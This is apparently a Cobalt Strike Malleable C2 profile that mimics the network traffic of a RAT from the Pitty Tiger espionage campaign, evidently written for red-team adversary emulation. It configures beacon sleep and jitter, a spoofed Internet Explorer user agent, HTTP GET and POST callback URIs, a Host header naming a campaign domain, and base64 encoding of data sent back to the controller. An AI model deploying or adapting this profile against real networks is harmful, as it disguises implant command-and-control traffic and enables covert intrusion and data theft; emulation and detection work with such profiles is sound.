#
# Pitty Tiger RAT profile
#   http://bitbucket.cassidiancybersecurity.com/whitepapers/downloads/Pitty%20Tiger%20Final%20Report.pdf
#
# One of several RATs used by the Pitty Tiger campaign
#
# Author: @harmj0y
#

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "20"; 
set maxdns    "255";
set useragent "Microsoft Internet Explorer";

http-get {

    set uri "/FC001/JOHN";

    client {

        header "Host" "newb02.skypetm.com.tw";
        header "Connection" "Keel-Alive";

        metadata {
            netbiosu;
            uri-append;
        }
    }

    server {

        header "Connection" "Keel-Alive";
        header "Content-Type" "text/html";
        header "Server" "IIS5.0";

        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/FC001/JOHN-";

    client {

        header "Host" "newb02.skypetm.com.tw";
        header "Connection" "Keel-Alive";

        id {
            netbiosu;
            uri-append;
        }

        output {
            base64;
            print;
        }
    }

    server {

        header "Connection" "Keel-Alive";
        header "Content-Type" "text/html";
        header "Server" "IIS5.0";

        output {
            base64;
            print;
        }
    }
}

